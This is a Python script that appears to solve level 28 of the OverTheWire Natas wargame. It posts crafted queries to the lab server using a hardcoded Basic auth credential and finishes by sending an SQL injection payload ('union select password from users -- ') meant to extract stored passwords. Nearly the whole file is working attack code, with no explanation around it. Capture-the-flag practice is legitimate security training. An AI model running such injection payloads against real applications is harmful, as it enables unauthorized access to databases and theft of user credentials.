import requests
import urllib.parse
import string

# Base URL
url = 'http://natas28.natas.labs.overthewire.org'

# Function to make a POST request and get the redirected URL and response
def send_post_request(query):

    # Our parameters
    params = dict(query=query)

    headers = {
        'Authorization': 'Basic bmF0YXMyODpza3J3eGNpQWU2RG5iMFZmRkR6REVIY0N6UW12M0dkNA==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas28.natas.labs.overthewire.org',
        'Referer': 'http://natas28.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the POST request with params
    response = requests.post(url, headers=headers, params=params)

    # Extract the query part from the URL
    parsed_url = urllib.parse.urlparse(response.url)
    query_value = urllib.parse.parse_qs(parsed_url.query)['query'][0]

    # URL decode the extracted query part
    decoded_query = urllib.parse.unquote(query_value)
    
    return decoded_query

# send 1 to 20 a's
# for i in (string.printable):
#     decoded_query = send_post_request(i)
#     print(f"{i}: {decoded_query}")

decoded_query = send_post_request("aaaaaaaaa' union select password from users -- ")
print(decoded_query)